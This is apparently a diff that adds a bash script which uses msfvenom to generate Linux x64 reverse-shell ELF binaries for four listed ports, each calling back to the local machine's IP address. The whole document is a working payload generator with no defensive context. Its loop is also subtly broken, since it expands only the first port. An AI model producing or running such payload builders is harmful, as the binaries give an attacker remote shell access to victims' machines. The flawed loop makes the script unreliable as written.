@@ -1,0 +1,5 @@
+ports=("9999" "2323" "1919" "1212")
+
+for port in "${ports}"; do
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$(hostname -I | awk '{print $1}') LPORT=$port -f elf > $port.elf < /dev/null
+done
